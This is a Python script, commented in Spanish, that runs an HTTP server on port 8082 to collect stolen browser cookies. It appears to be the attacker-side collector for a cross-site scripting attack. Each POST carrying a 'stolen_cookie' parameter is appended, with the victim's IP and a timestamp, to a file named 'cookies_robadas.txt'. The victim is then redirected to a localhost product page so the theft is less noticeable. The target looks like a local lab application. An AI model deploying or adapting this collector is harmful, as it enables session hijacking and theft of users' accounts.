# Importar módulos necesarios
from http.server import BaseHTTPRequestHandler, HTTPServer  # Para crear un servidor HTTP básico
from urllib.parse import parse_qs  # Para analizar datos de formularios codificados en URL
import datetime  # Para manejar fechas y horas

# Definir una clase personalizada para manejar las solicitudes HTTP
class MyHandler(BaseHTTPRequestHandler):
    # Método para manejar solicitudes POST
    def do_POST(self):
        # Obtener la longitud del contenido de la solicitud
        content_length = int(self.headers['Content-Length'])
        # Leer los datos enviados en la solicitud POST
        post_data = self.rfile.read(content_length).decode('utf-8')
        # Analizar los datos POST para extraer parámetros
        params = parse_qs(post_data)
        # Obtener las cookies robadas (si existen)
        cookies = params.get('stolen_cookie', ['No cookies'])[0]
        
        # Guardar las cookies robadas en un archivo de texto
        with open("cookies_robadas.txt", "a") as f:
            # Crear una línea de registro con la fecha, IP y cookies
            log = f"[{datetime.datetime.now()}] IP: {self.client_address[0]} | Cookies: {cookies}\n"
            f.write(log)  # Escribir la línea en el archivo
        
        # Redirigir al cliente a otra ubicación SIN crear un bucle
        self.send_response(302)  # Código de estado HTTP 302 (Redirección)
        self.send_header('Location', 'http://localhost:8080/templates/product/product_list.php')  # URL de redirección
        self.end_headers()  # Finalizar las cabeceras de la respuesta

    # Método para manejar solicitudes GET
    def do_GET(self):
        self.send_response(200)  # Código de estado HTTP 200 (OK)
        self.end_headers()  # Finalizar las cabeceras de la respuesta
        self.wfile.write(b"Servidor activo")  # Enviar un mensaje de respuesta al cliente

# Punto de entrada del script
if __name__ == "__main__":
    # Crear un servidor HTTP que escuche en todas las interfaces (0.0.0.0) en el puerto 8082
    server = HTTPServer(('0.0.0.0', 8082), MyHandler)
    print("Servidor escuchando en puerto 8082...")
    # Mantener el servidor en ejecución indefinidamente
    server.serve_forever()